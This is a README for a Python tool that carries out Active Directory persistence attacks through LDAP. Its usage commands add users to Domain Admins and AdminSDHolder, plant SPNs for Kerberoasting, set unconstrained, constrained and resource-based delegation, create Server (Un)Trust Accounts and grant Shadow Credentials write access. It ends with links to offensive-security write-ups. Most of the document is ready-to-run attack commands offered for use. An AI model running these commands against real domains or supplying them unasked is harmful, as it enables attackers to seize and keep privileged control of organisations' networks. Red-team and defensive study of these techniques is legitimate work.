# LDAP Persistence
Python tool to execute several Active Directory persistence techniques through LDAP queries.

## Features

- Add user to Domain Admins Group
- Add user to AdminSDHolder
- Add SPN to user for later Kerberoasting
- Add Unconstrained Delegation to Computer
- Add Server (Un)Trust Account
- Add write access to msDS-KeyCredentialLink for the target computer (Shadow Credentials attack)
- Add Constrained Delegation to Computer
- Add Resource-Based Contrained Delegation to Computer

## Usage

### Add user to Domain Admins Group:

```
python3 ldappersistence.py <HOST> -u domain\user -p password -a 0 -t targetUser
```

### Add user to AdminSDHolder

```
python3 ldappersistence.py <HOST> -u domain\user -p password -a 1 -t targetUser 
```

### Add SPN to user for later Kerberoasting

```
python3 ldappersistence.py <HOST> -u domain\user -p password -a 2 -t targetUser -spn example.local/test.example.local
```

### Add Unconstrained Delegation to Computer

```
python3 ldappersistence.py <HOST> -u domain\user -p password -a 3 -t targetComputer
```

### Add Server (Un)Trust Account

```
python3 ldappersistence.py <HOST> -u domain\user -p password -a 4 -t targetComputer
```

### Add write access to msDS-KeyCredentialLink for the target Computer (Shadow Credentials attack)

Keep in mind that in order to exploit the Shadow Credentials attack you need the following requirements:
- Domain must have Active Directory Certificate Services and Certificate Authority configured.
- Domain must have at least one DC running with Windows Server 2016 that supports PKINIT.

```
python3 ldappersistence.py <HOST> -u domain\user -p password -a 5 -t targetComputer
```

### Add Constrained Delegation to Computer

```
python3 ldappersistence.py <HOST> -u domain\user -p password -a 6 -t targetComputer -spn cifs/test.example.local
```

### Add Resource-Based Constrained Delegation to Computer

```
python3 ldappersistence.py <HOST> -u domain\user -p password -a 7 -t targetComputer -computer example-pc
```

## References

AdminSDHolder - https://adsecurity.org/?p=1906

Add SPN to user for later kerberoasting - https://adsecurity.org/?p=3466

Shadow Credentials - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials

Unconstrained Delegation - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation

Constrained Delegation - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation

Resource-Based Constrained Delegation - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution

Add Server (Un)Trust Account - https://stealthbits.com/blog/server-untrust-account/
